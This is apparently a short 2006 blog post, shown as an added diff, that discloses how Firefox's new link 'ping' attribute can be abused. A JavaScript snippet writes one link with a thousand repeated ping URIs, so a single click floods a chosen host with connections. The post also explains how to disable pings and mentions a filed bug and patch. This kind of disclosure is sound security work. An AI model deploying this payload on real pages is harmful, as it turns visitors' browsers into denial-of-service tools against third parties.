@@ -1,0 +1,21 @@
+firefox's new &lt;a ping&gt; vuln^H^H^H^Hfeature
+#tags security,code
+<p>
+As seen recently on <a href="http://yro.slashdot.org/article.pl?sid=06/01/18/1427212">slashdot</a>, one of the latest trunk builds of Firefox contains support for the <a href="http://weblogs.mozillazine.org/darin/archives/009594.html"><i>ping</i> attribute</a> on anchor and area tags (<a href="http://whatwg.org/specs/web-apps/current-work/#ping">spec</a>).  Ideally, this feature will allow websites to contain links such as:
+<code><blockquote><pre>
+&lt;a href="http://foo" ping="http://bar"&gt;biz&lt;/a&gt;
+</pre></blockquote></code>
+After looking into it a bit more, I found a way to trigger a user's Firefox to SYN flood any given host upon clicking a link.
+<code><blockquote><pre>
+&lt;script language="JavaScript"&gt;
+    document.write('&lt;a href="http://foobar" ping="');
+    for (var i = 0; i &lt; 1000; i++)
+        document.write('URI ');
+    document.write('"&gt;Weeee!&lt;/a&gt;');
+&lt;/script&gt;
+</pre></blockquote></code>
+</p>
+When clicked, the link will cause the client to kick 1000 SYN packets over to the specified ping URI without hesitation.  This feature is present in Firefox &gt; 1.6a1, and is enabled by default.  You can disable this in <b>about:config</b> by flipping off the <b>browser.send_pings</b> boolean.
+I filed a <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=324599">bug</a> upstream about this issue, and supplied a patch to de-dupe the ping URI list (which might actually not be the best solution to this problem (limiting the number of ping URI's, or kill the pings when the page is left, or the stop button is pressed might be better solutions), but it is still under discussion).
+</pre></blockquote></code>
+</p>
